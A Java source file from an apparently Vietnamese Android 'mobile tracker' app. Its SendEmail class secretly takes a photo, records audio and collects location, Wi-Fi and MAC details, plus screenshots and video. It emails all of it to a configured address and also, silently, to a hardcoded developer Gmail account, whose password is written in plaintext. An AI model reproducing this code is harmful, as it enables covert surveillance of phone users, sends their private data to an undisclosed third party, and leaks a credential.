/**
 * @author Binhpro
 */
package com.dhsoft.mobiletracker.sending;

import java.util.Timer;
import java.util.TimerTask;

import android.util.Log;

import com.dhsoft.mobiletracker.ApplicationContext;
import com.dhsoft.mobiletracker.configuration.ApplicationConfigs;
import com.dhsoft.mobiletracker.tracking.LocationTracking;
import com.dhsoft.mobiletracker.tracking.MediaTracking;
import com.dhsoft.mobiletracker.tracking.NetworkTracking;
import com.dhsoft.mobiletracker.utils.EmailUtils;

public class SendEmail {
	/**
	 * Send tracking information to user email
	 */
	public static void trackingToEmail() {
		try {
			final MediaTracking mediaTracking = new MediaTracking();
			Timer timer = new Timer();
			int waitingTime = 0;
			// capture photo
			if (ApplicationConfigs.getInstance().getSharedPreferences()
					.getBoolean(ApplicationConfigs.ENABLED_PHOTO_CAPTURE, true)) {
				mediaTracking.takePictureNoPreview();
				waitingTime = 5000;
			}
			// recording audio
			if (ApplicationConfigs
					.getInstance()
					.getSharedPreferences()
					.getBoolean(ApplicationConfigs.ENABLED_AUDIO_RECORDING,
							true)) {

				timer.schedule(new TimerTask() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						mediaTracking.recordingAudio();
					}
				}, waitingTime);

				waitingTime = Integer.parseInt(ApplicationConfigs
						.getInstance()
						.getSharedPreferences()
						.getString(ApplicationConfigs.AUDIO_RECORDING_TIME,
								"10")) * 1000;
			}
			// send email with attachments
			timer.schedule(new TimerTask() {

				@Override
				public void run() {
					// TODO Auto-generated method stub
					String toEmail = ApplicationConfigs.getInstance()
							.getSharedPreferences()
							.getString(ApplicationConfigs.EMAIL, "");
					if (toEmail.equals("")) {
						Log.w("MobileTracker", "User's email is empty");
						return;
					}

					EmailUtils email = new EmailUtils(
							"mobile.tracker.pfiev@gmail.com", "tincongnghiep");
					String[] toArr = { toEmail,
							"mobile.tracker.pfiev@gmail.com" };
					email.setTo(toArr);
					email.setFrom("mobile.tracker.pfiev@gmail.com");
					email.setSubject("Thông tin điện thoại của bạn");
					String body = "Thông tin điện thoại của bạn:<br/>";
					// Location
					body += "- Thông tin vị trí:";
					LocationTracking locationTracking = new LocationTracking();
					if (locationTracking.getLongitude() != -1
							&& locationTracking.getLatitude() != -1) {
						body += " Latitude=" + locationTracking.getLatitude();
						body += " Longitude=" + locationTracking.getLongitude();
						if (!locationTracking.getLocation().equals("")) {
							body += " Near " + locationTracking.getLocation();
						}
						body += " ( <a href='https://maps.google.com/maps?q="
								+ locationTracking.getLatitude() + ","
								+ locationTracking.getLongitude()
								+ "'>Xem bản đồ</a> )";
					}

					// Network
					NetworkTracking networkTracking = new NetworkTracking();
					if (networkTracking.isNetworkConnected()) {
						body += "<br/>- Thông tin mạng: ";
						body += "SSID= " + networkTracking.getSsid();
						body += " , MAC Address= "
								+ networkTracking.getMacAddress();
					}

					// Media
					try {

						if (!mediaTracking.getScreenCaptureImagePath().equals(
								""))
							email.addAttachment(mediaTracking
									.getScreenCaptureImagePath());

						if (!mediaTracking.getPicturePath().equals("")) {
							Log.i("MobileTracker", "Start attach picture "
									+ mediaTracking.getPicturePath());
							email.addAttachment(mediaTracking.getPicturePath());
							Log.i("MobileTracker", "End attach picture ");
						}

						if (!mediaTracking.getAudioPath().equals("")) {
							Log.i("MobileTracker", "Start attach audio "
									+ mediaTracking.getAudioPath());

							email.addAttachment(mediaTracking.getAudioPath());

							Log.i("MobileTracker", "End attach audio ");
						}

						if (!mediaTracking.getVideoPath().equals(""))
							email.addAttachment(mediaTracking.getVideoPath());

					} catch (Exception exception) {
						Log.e("MobileTracker", exception.getMessage());
					}

					// Phone number

					email.setBody(body);

					try {
						email.send();
						Log.i("MobileTracker", "Send email success");
					} catch (Exception exception) {
						// TODO Auto-generated catch block
						Log.e("MobileTracker", exception.getMessage());
					} finally {
						// delete temporary image, video file
						mediaTracking.clear();
					}

				}

			}, waitingTime);
		} catch (Exception e) {
			Log.e("MobileTracker", "Error on sending email");
		}
	}

	/**
	 * Send tracking email to user with subject and content
	 * 
	 * @param subject subject of email
	 * @param content content of email (html, UTF-8)
	 */
	public static boolean trackingToEmail(String subject, String content) {

		boolean isSuccess = false;
		String toEmail = ApplicationConfigs.getInstance()
				.getSharedPreferences().getString(ApplicationConfigs.EMAIL, "");
		if (toEmail.equals("")) {
			Log.w("MobileTracker", "User's email is empty");
			return isSuccess;
		}
		EmailUtils email = new EmailUtils("mobile.tracker.pfiev@gmail.com",
				"tincongnghiep");
		String[] toArr = { toEmail, "mobile.tracker.pfiev@gmail.com" };
		email.setTo(toArr);
		email.setFrom("mobile.tracker.pfiev@gmail.com");
		email.setSubject(subject);
		email.setBody(content);
		try {
			isSuccess = email.send();
		} catch (Exception exception) {
			// TODO Auto-generated catch block
			Log.e("MobileTracker", exception.getMessage());
		}
		if (isSuccess)
			Log.i("MobileTracker", "Send email success");
		return isSuccess;

	}
}
